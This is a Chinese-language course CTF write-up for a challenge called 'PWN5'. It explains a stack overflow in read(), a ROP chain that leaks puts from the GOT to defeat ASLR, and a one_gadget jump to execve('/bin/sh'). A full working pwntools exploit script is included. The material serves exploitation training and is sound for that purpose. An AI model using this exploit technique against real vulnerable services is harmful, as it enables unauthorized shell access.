### PWN5

#### 考点

- 对`ldd, patchelf`命令以及依赖库版本的了解
- 对ASLR机制的理解
- `one_gadget`工具使用

#### 解题过程

- 首先使用`checksec, files`查看程序基本信息：

![checksec](C:\SJTU\课程\大四上\信息安全综合实践（2）\练习\pwn5\images\checksec.png)

![file](C:\SJTU\课程\大四上\信息安全综合实践（2）\练习\pwn5\images\file.png)

​		可见程序为64位，开启DEP保护，为动态链接的程序。

- 使用`ldd`命令检查程序运行所需的依赖库，其中包括程序所依赖的C函数库`libc.so.6`以及动态链接器 `ld-linux-x86-64.so.2` 的路径  

![ldd](C:\SJTU\课程\大四上\信息安全综合实践（2）\练习\pwn5\images\ldd.png)

- 使用 `patchelf `替换 `libc` 与 `ld` 到指定版本，该步骤目的是将本地运行环境调整到与预期一致。 `libc` 与 `ld` 的版本必须匹配，题中给定了 `libc-2.23.so` ，因此需要2.23版本的 `ld` 。 

 ![ldd-1](C:\SJTU\课程\大四上\信息安全综合实践（2）\练习\pwn5\images\ldd-1.png)

- 使用`ida`打开，反编译：

`main`: 

![main](C:\SJTU\课程\大四上\信息安全综合实践（2）\练习\pwn5\images\main.png)

`stack_flow`: `read`函数存在漏洞

![stack_flow](C:\SJTU\课程\大四上\信息安全综合实践（2）\练习\pwn5\images\stack_flow.png)

- 使用`ROPgadget`工具查找程序中是否有`system`函数和`"/bin/sh"`字符串，结果表明并没有，因此需要自行输入字符串，并从动态链接库中查找`system`函数的偏移

![system&bin_sh](C:\SJTU\课程\大四上\信息安全综合实践（2）\练习\pwn5\images\system&bin_sh.png)

- 构造脚本获取到`puts`函数在`libc`中的相对偏移：

  ```python
  from pwn import *
  
  
  libc= ELF('./libc-2.23.so')
  
  libc_puts_offset = libc.symbols['puts']
  print(hex(libc_puts_offset))
  ```

![puts_related_addr](C:\SJTU\课程\大四上\信息安全综合实践（2）\练习\pwn5\images\puts_related_addr.png)

- 使用`one_gadget`工具获取到命令地址`exceve("/bin/sh")`

![one_gadget](C:\SJTU\课程\大四上\信息安全综合实践（2）\练习\pwn5\images\one_gadget.png)

- 构造python脚本实现`"/bin/sh"`字符串的输入。

```python
from pwn import *

# 启动进程
context(arch='amd64', log_level='debug')
p = process('./pwn5')

elf = ELF("./pwn5")
p.recvuntil("Give me your payload\n")

# 参数地址
libc= ELF('./libc-2.23.so')
libc_puts_offset = libc.symbols['puts']
print(hex(libc_puts_offset))
libc_system_offset = libc.symbols['system']
print(hex(libc_system_offset))
libc_one_gadget_offset = 0x0f1247

pop_rdi = 0x400613
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
main_addr = 0x400587

# 构造payload泄漏puts函数地址
payload1 = flat(b'a'*(0x20 + 8), pop_rdi, puts_got, puts_plt, main_addr)
p.send(payload1)
puts_libc = p.recv(6)
puts_libc = u64(puts_libc.ljust(8, b'\x00'))
success(hex(puts_libc))

libc_base = puts_libc - libc_puts_offset
success(hex(libc_base))
one_gadget = libc_base + libc_one_gadget_offset
print(hex(one_gadget))

payload2 = b'a'*(0x20 + 8) + p64(one_gadget)
p.recvuntil("Give me your payload\n")
# gdb.attach(p, 'b *0x400585')
p.send(payload2)
p.interactive()
```



- 重要的函数地址以及偏移量：

| 函数                   | 地址               |
| ---------------------- | ------------------ |
| `main`                 | 0x0000000000400587 |
| `stack_overflow`       | 0x0000000000400566 |
| `stack_overflow_leave` | 0x0000000000400585 |
| `pop_rdi`              | 0x0000000000400613 |
| `one_gadget`           | 0x0f1247           |



#### 结果

成功执行命令：

![image-20231001182756684](C:\Users\Eknight\AppData\Roaming\Typora\typora-user-images\image-20231001182756684.png)